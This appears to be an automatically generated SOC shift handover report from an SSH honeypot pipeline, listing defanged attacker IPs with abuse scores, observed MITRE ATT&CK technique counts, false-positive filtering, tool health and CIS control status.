## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.33.14[.]5` | US | Linode | **100** ⚠️ | 50 |
| `112.64.169[.]110` | CN | Shanghai DIA Dedicated Internet Access | **100** ⚠️ | 28 |
| `192.155.90[.]220` | US | Linode | **100** ⚠️ | 50 |
| `45.79.207[.]129` | US | Linode | **100** ⚠️ | 50 |
| `34.156.151[.]177` | BE | Google LLC | **100** ⚠️ | 0 |
| `130.12.180[.]51` | DE | Virtualine Technologies | **100** ⚠️ | 50 |
| `209.99.190[.]110` | CH | SKN Subnet & Telecom Ltd | **100** ⚠️ | 5 |
| `199.165.159[.]57` | US | The Shadowserver Foundation, Inc. | **100** ⚠️ | 2 |
| `216.218.219[.]164` | US | Hurricane Electric LLC | **100** ⚠️ | 9 |
| `190.232.93[.]49` | PE | PE-TDP-GRS | **100** ⚠️ | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 151 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 103 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 35 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 35 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 11 |

---

## 🔕 False Positive Summary (55 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 17 |
| AbuseIPDB score 11 below threshold 25 | 1 |
| AbuseIPDB score 12 below threshold 25 | 1 |
| AbuseIPDB score 15 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 31 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 304 cases |
| Tool 34  | Credential Extractor        | ✅ 2375 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 25 fingerprints |
| Tool 36  | Command Clustering          | ✅ 16 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 193 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 55 filtered (18.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 82 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 30 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 103 priority case(s) shown individually · 128 recon entry/entries in table (12 group(s) consolidating 30 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-09T17:43:54Z_
